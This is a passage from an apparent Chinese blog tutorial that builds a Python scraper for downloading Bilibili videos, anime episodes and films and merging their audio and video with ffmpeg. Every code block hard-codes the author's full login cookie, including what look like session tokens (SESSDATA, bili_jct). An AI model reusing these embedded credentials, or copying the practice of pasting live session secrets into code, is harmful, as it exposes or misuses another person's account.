class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 解析源码获得视频名称、链接</span><br><span class="line">    def analysis(self, html):</span><br><span class="line">        tree = etree.HTML(html)</span><br><span class="line">        # 视频名称</span><br><span class="line">        name = tree.xpath(&#x27;//*[@id=&quot;viewbox_report&quot;]/h1/text()&#x27;)[0]</span><br><span class="line">        # 视频链接列表</span><br><span class="line">        video_list = tree.xpath(&#x27;//script[contains(text(), &quot;window.__playinfo__&quot;)]/text()&#x27;)[0]</span><br><span class="line">        # 视频链接</span><br><span class="line">        video = re.findall(r&#x27;&quot;video&quot;:\[&#123;&quot;id&quot;:\d+,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        audio = re.findall(r&#x27;&quot;audio&quot;:\[&#123;&quot;id&quot;:30280,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        return video, audio, name</span><br></pre></td></tr></table></figure><p>分别获取到视频和音频的链接</p><p>就可以发起请求进行合并了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对链接发起请求，并进行合并存储</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">self, link</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: self.url,</span><br><span class="line">            <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在下载视频&#x27;</span>)</span><br><span class="line">        video = requests.get(link[<span class="number">0</span>], headers=headers).content</span><br><span class="line">        audio = requests.get(link[<span class="number">1</span>], headers=headers).content</span><br><span class="line"></span><br><span class="line">        name = link[<span class="number">2</span>] + <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(video)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(audio)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;合并视频&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        ffmpeg_tools.ffmpeg_merge_video_audio(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;link[<span class="number">2</span>]&#125;</span>.mp4&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;下载成功&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除之前的文件</span></span><br><span class="line">        os.remove(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>)</span><br><span class="line">        os.remove(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>全部代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Video</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url</span>):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取页面源码</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self</span>):</span><br><span class="line">        response = requests.get(self.url, headers=self.headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析源码获得视频名称、链接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">self, html</span>):</span><br><span class="line">        tree = etree.HTML(html)</span><br><span class="line">        <span class="comment"># 视频名称</span></span><br><span class="line">        name = tree.xpath(<span class="string">&#x27;//*[@id=&quot;viewbox_report&quot;]/h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 视频链接列表</span></span><br><span class="line">        video_list = tree.xpath(<span class="string">&#x27;//script[contains(text(), &quot;window.__playinfo__&quot;)]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 视频链接</span></span><br><span class="line">        video = re.findall(<span class="string">r&#x27;&quot;video&quot;:\[&#123;&quot;id&quot;:\d+,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;</span>, video_list)[<span class="number">0</span>]</span><br><span class="line">        audio = re.findall(<span class="string">r&#x27;&quot;audio&quot;:\[&#123;&quot;id&quot;:30280,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;</span>, video_list)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> video, audio, name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对链接发起请求，并进行合并存储</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">self, link</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: self.url,</span><br><span class="line">            <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在下载视频&#x27;</span>)</span><br><span class="line">        video = requests.get(link[<span class="number">0</span>], headers=headers).content</span><br><span class="line">        audio = requests.get(link[<span class="number">1</span>], headers=headers).content</span><br><span class="line"></span><br><span class="line">        name = link[<span class="number">2</span>] + <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(video)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(audio)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;合并视频&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        ffmpeg_tools.ffmpeg_merge_video_audio(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;link[<span class="number">2</span>]&#125;</span>.mp4&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;下载成功&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除之前的文件</span></span><br><span class="line">        os.remove(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp4&#x27;</span>)</span><br><span class="line">        os.remove(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>.mp3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        html = self.get_page()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;获取到源码&#x27;</span>)</span><br><span class="line">        link = self.analysis(html)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;获取到链接&#x27;</span>, link)</span><br><span class="line">        self.save(link)</span><br></pre></td></tr></table></figure><p>你以为这样就结束了,还没有增强呢!</p><p>只爬取普通视频显得这个代码有些垃圾了,接下来添加爬取番剧及电影的代码</p><p>先看一下番剧的包</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220831211218759.png" alt="image-20220831211218759"></p><p>包抓到了和普通视频一样</p><p>链接位置似乎有些不一样</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220831211348322.png" alt="image-20220831211348322"></p><p>找到视频链接就可以写代码了,不过这次不用从头写了,前面已经写好了爬取普通视频的代码了,完全可以拿来就用,</p><p>上面用类来写的爬虫,所以我们完全可以继承他,只重写其中的解析视频链接的代码</p><p>直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Drama</span>(<span class="title class_ inherited__">Video</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">self, html</span>):</span><br><span class="line">        tree = etree.HTML(html)</span><br><span class="line">        <span class="comment"># 视频名称</span></span><br><span class="line">        name = tree.xpath(<span class="string">&#x27;//title/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 视频链接列表</span></span><br><span class="line">        video_list = tree.xpath(<span class="string">&#x27;//script[contains(text(), &quot;window.__playinfo__&quot;)]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        video = re.findall(<span class="string">r&#x27;&quot;video&quot;:\[.*?&quot;backupUrl&quot;:\[&quot;(.*?)&quot;&#x27;</span>, video_list)[<span class="number">0</span>]</span><br><span class="line">        audio = re.findall(<span class="string">r&#x27;&quot;audio&quot;:\[.*?&quot;backupUrl&quot;:\[&quot;(.*?)&quot;&#x27;</span>, video_list)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> video, audio, name</span><br></pre></td></tr></table></figure><p>电影的结构和番剧一样可以直接调用,</p><p>再判断一下传入的链接是普通视频还是番剧又或者是电影</p><p>普通视频</p><blockquote><p><a href="https://www.bilibili.com/video/BV1c341187m9">https://www.bilibili.com/video/BV1c341187m9</a></p></blockquote><p>番剧</p><blockquote><p><a href="https://www.bilibili.com/bangumi/play/ep508404?from_spmid=666.25.episode.0&amp;from_outer_spmid=666.4.0.0">https://www.bilibili.com/bangumi/play/ep508404?from_spmid=666.25.episode.0&amp;from_outer_spmid=666.4.0.0</a></p></blockquote><p>电影</p><blockquote><p><a href="https://www.bilibili.com/bangumi/play/ep673044?from_spmid=666.7.banner.0">https://www.bilibili.com/bangumi/play/ep673044?from_spmid=666.7.banner.0</a></p></blockquote><p>通过以上链接可以看出普通视频的链接包含<code>video</code>,番剧和电影的链接包含<code>play</code>,再加上爬取番剧和电影的代码一样,就可以这样写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url_list = [</span><br><span class="line">        &#x27;https://www.bilibili.com/bangumi/play/ss42077?theme=movie&#x27;</span><br><span class="line">        ]</span><br><span class="line">    for i in url_list:</span><br><span class="line">        if &#x27;video&#x27; in i:</span><br><span class="line">            p = Video(i)</span><br><span class="line">            p.run()</span><br><span class="line">        elif &#x27;play&#x27; in i:</span><br><span class="line">            d = Drama(i)</span><br><span class="line">            d.run()</span><br><span class="line">        else:</span><br><span class="line">            error(i)</span><br></pre></td></tr></table></figure><p>在写一个异常方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def error(url):</span><br><span class="line">    print(&#x27;自动识别错误，请手动选择&#x27;)</span><br><span class="line">    flash = True</span><br><span class="line">    while flash:</span><br><span class="line">        choose = input(&#x27;1.视频, 2.番剧或电影\n&#x27;)</span><br><span class="line">        if choose == &#x27;1&#x27;:</span><br><span class="line">            print(&#x27;视频&#x27;)</span><br><span class="line">            p = Video(url)</span><br><span class="line">            p.run()</span><br><span class="line">        elif choose == &#x27;2&#x27;:</span><br><span class="line">            print(&#x27;番剧或电影&#x27;)</span><br><span class="line">            d = Drama(url)</span><br><span class="line">            d.run()</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;输入格式有误，请重新输入&#x27;)</span><br></pre></td></tr></table></figure><p>合并后代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"># 视频爬取</span><br><span class="line">class Video:</span><br><span class="line">    def __init__(self, url):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            &quot;cookie&quot;: &quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;,</span><br><span class="line">            &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    # 获取页面源码</span><br><span class="line">    def get_page(self):</span><br><span class="line">        response = requests.get(self.url, headers=self.headers)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            return response.text</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    # 解析源码获得视频名称、链接</span><br><span class="line">    def analysis(self, html):</span><br><span class="line">        tree = etree.HTML(html)</span><br><span class="line">        # 视频名称</span><br><span class="line">        name = tree.xpath(&#x27;//*[@id=&quot;viewbox_report&quot;]/h1/text()&#x27;)[0]</span><br><span class="line">        # 视频链接列表</span><br><span class="line">        video_list = tree.xpath(&#x27;//script[contains(text(), &quot;window.__playinfo__&quot;)]/text()&#x27;)[0]</span><br><span class="line">        # 视频链接</span><br><span class="line">        video = re.findall(r&#x27;&quot;video&quot;:\[&#123;&quot;id&quot;:\d+,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        audio = re.findall(r&#x27;&quot;audio&quot;:\[&#123;&quot;id&quot;:30280,&quot;baseUrl&quot;:&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        return video, audio, name</span><br><span class="line"></span><br><span class="line">    # 对链接发起请求，并进行合并存储</span><br><span class="line">    def save(self, link):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &#x27;referer&#x27;: self.url,</span><br><span class="line">            &quot;cookie&quot;: &quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;,</span><br><span class="line">            &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        print(&#x27;正在下载视频&#x27;)</span><br><span class="line">        video = requests.get(link[0], headers=headers).content</span><br><span class="line">        audio = requests.get(link[1], 